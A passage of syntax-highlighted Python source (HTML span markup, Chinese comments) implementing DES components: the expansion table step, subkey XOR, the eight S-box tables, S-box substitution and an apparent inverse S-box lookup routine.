                <span class="mi">27</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">0</span>
                <span class="p">]</span>
<span class="k">def</span> <span class="nf">extend_replacement</span><span class="p">(</span><span class="n">Right_table</span><span class="p">)</span> <span class="p">:</span>
    <span class="n">extend_list</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">48</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
        <span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">Right_table</span><span class="p">[</span><span class="n">_extend_table</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>
    <span class="k">return</span> <span class="n">extend_list</span>

<span class="c1">#与子密钥异或</span>
<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">lits</span><span class="p">,</span><span class="n">Key</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lits</span><span class="p">)):</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">lits</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">Key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="c1">#S盒替换</span>
<span class="n">S1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">14</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span>
      <span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span>
      <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
      <span class="mi">15</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">13</span><span class="p">]</span>
<span class="n">S2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">15</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
      <span class="mi">3</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span>
      <span class="mi">0</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span>
      <span class="mi">13</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">9</span><span class="p">]</span>
<span class="n">S3</span> <span class="o">=</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span>
      <span class="mi">13</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
      <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span>
      <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">]</span>
<span class="n">S4</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span>
      <span class="mi">13</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span>
      <span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span>
      <span class="mi">3</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">14</span><span class="p">]</span>
<span class="n">S5</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span>
      <span class="mi">14</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span>
      <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span>
      <span class="mi">11</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
<span class="n">S6</span> <span class="o">=</span> <span class="p">[</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span>
      <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span>
      <span class="mi">9</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span>
      <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">]</span>
<span class="n">S7</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
      <span class="mi">13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span>
      <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
      <span class="mi">6</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">12</span><span class="p">]</span>
<span class="n">S8</span> <span class="o">=</span> <span class="p">[</span><span class="mi">13</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span>
      <span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
      <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span>
      <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">11</span><span class="p">]</span>
<span class="n">S_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">S1</span><span class="p">,</span> <span class="n">S2</span><span class="p">,</span> <span class="n">S3</span><span class="p">,</span> <span class="n">S4</span><span class="p">,</span> <span class="n">S5</span><span class="p">,</span> <span class="n">S6</span><span class="p">,</span> <span class="n">S7</span><span class="p">,</span> <span class="n">S8</span><span class="p">]</span>

<span class="c1">#S盒置换</span>
<span class="k">def</span> <span class="nf">s_box_replace</span><span class="p">(</span><span class="n">xor_list_key</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">row</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">5</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">column</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">xor_list_key</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">s_result</span><span class="o">=</span><span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">row</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">column</span><span class="p">]</span>
        <span class="n">num</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">s_result</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">_s_box_replace</span><span class="p">(</span><span class="n">new_p_box_list</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]],</span>
              <span class="p">[[],[],[],[]]]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
         <span class="n">sp</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
         <span class="n">sp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">((</span><span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">0</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
         <span class="n">sp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">((</span><span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">0</span><span class="p">),</span><span class="mi">16</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span>
         <span class="n">sp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">((</span><span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">0</span><span class="p">),</span><span class="mi">32</span><span class="p">,</span><span class="mi">48</span><span 